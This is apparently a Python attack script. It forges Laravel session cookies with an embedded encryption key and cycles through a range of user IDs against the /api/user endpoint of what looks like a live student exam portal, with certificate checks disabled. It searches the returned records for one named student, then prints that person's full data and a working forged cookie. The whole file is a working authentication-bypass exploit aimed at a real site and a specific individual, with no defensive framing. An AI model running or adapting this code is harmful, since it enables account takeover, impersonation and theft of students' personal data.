import base64, json, requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

KEY = base64.b64decode("kbqL/05YWl0TZEnb3oE4811UauhKhWps9c4IWsQiFHQ=")

def forge_cookie(uid):
    payload = {
        "id": uid,
        "login_web_59ba36addc2b2f9401580f014c7f58ea4e30989d": uid
    }
    iv = AES.get_random_bytes(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    enc = cipher.encrypt(pad(json.dumps(payload).encode(), AES.block_size))
    final = base64.b64encode(
        json.dumps({"iv": base64.b64encode(iv).decode(), "value": base64.b64encode(enc).decode()}).encode()
    ).decode()
    return final

# Range based on your CSV max ID
START = 2400
END = 3500

print(f"[*] Scanning IDs {START} to {END} via /api/user (lighter & faster)...")

for uid in range(START, END + 1):
    cookie = forge_cookie(uid)
    try:
        resp = requests.get(
            "https://student.citexams.in/api/user",
            cookies={"laravel_session": cookie},
            verify=False,
            timeout=2,
            headers={"Accept": "application/json"}
        )
        if resp.status_code == 200:
            data = resp.json()
            if "AFNAN TARIQ" in str(data):
                print(f"\n✅✅✅ FOUND AFNAN TARIQ at ID: {uid} ✅✅✅")
                print(f"Full JSON: {json.dumps(data, indent=2)}")
                print(f"Cookie: {cookie}")
                break
        if uid % 50 == 0:
            print(f"   ...checked up to {uid} (last status: {resp.status_code})")
    except:
        pass
    time.sleep(0.03)

print("\n[*] Scan complete.")